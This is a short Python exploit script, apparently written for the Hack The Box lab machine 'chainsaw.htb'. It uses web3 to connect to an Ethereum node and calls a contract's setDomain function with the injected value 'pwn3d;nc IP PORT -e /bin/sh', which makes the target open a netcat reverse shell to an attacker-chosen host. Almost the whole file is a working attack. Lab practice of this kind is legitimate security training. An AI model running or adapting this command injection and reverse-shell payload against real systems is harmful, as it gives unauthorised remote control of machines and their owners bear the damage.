#!/usr/bin/env python3


import json
from web3 import Web3, eth
from sys import argv

YELLOW = "\033[93m"
GREEN = "\033[32m"


def exploit(address, ip, port):
    print(YELLOW + "[+] Starting")
    print(YELLOW + "[+] Connecting to chainsaw.htb:9810")
    w3 = Web3(Web3.HTTPProvider('http://chainsaw.htb:9810'))
    print(GREEN + "[*] Connection Established")
    w3.eth.defaultAccount = w3.eth.accounts[0]
    print(YELLOW + "[+] Creating the contract representation")
    print(YELLOW + "[+] Address: {}".format(address))
    abi = json.loads(
        '[{"constant":true,"inputs":[],"name":"getDomain","outputs":[{"name":"","type": "string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_value","type":"string"}],"name":"setDomain","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"}]')
    contract = w3.eth.contract(address=address, abi=abi)
    print(GREEN + "[*] Done")
    print(YELLOW + "[+] Injecting Reverse Shell:")
    print(YELLOW + "  [!] IP: {}".format(ip))
    print(YELLOW + "  [!] PORT: {}".format(port))
    contract.functions.setDomain("pwn3d;nc {} {} -e /bin/sh".format(ip, port)).transact()
    print(GREEN + "[*] Domain Changed Successfully, New Value: " + contract.functions.getDomain().call())
    print(GREEN + "[*] Now wait for your reverse shell, Exiting...")
    exit()

# Use script with <address> <local IP> <Port>


if len(argv) != 4 or argv[1] == "-h":

    print(YELLOW + "[!] Usage: {} [contract address] [ip] [port]".format(argv[0]))
    exit()
else:
    address = argv[1]
    ip = argv[2]
    port = argv[3]
    exploit(address, ip, port)
